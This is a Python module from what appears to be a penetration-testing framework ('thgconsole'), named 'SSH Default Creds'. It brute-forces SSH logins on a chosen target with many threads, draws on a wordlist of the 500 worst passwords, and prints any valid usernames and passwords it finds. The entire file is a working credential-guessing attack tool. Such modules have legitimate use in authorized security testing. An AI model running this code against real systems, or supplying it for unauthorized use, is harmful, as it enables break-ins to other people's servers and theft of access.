import itertools
from thgconsole.core.ModulesBuild.Exploits.exploit import *
from thgconsole.core.ModulesBuild.Exploits.option import *
from thgconsole.core.CoreUtils.exceptions import *
from thgconsole.core.ModulesBuild.Exploits.shell import *
from thgconsole.core.CoreUtils.utils import *
from thgconsole.core.CoreUtils.option import *
from thgconsole.core.CoreUtils.printer import *
from thgconsole.file_suport import wordlists
from thgconsole.core.NetworkProtocols.ssh.ssh_client import SSHClient



class Exploit(SSHClient):
    __info__ = {
        "name": "SSH Default Creds",
        "description": "Module performs bruteforce attack against SSH service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "darkcode357@gmail.com",  # thg module
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = THGOptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = THGOptPort(22, "Target SSH port")

    threads = THGOptInteger(8, "Number of threads")

    defaults = THGOptWordlist(wordlists.worst_passwords500, "User:Pass or file with default credentials (file://)")

    verbosity = THGOptBool(True, "Display authentication attempts")
    stop_on_success = THGOptBool(True, "Stop on first valid authentication attempt")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default credentials attack against SSH service")

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next().split(":")
                ssh_client = self.ssh_create()
                if ssh_client.login(username, password):
                    if self.stop_on_success:
                        running.clear()

                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
                    ssh_client.close()

            except StopIteration:
                break

    def check(self):
        ssh_client = self.ssh_create()
        if ssh_client.test_connect():
            print_status("Target exposes SSH service", verbose=self.verbosity)
            return True

        print_status("Target does not expose SSH", verbose=self.verbosity)
        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
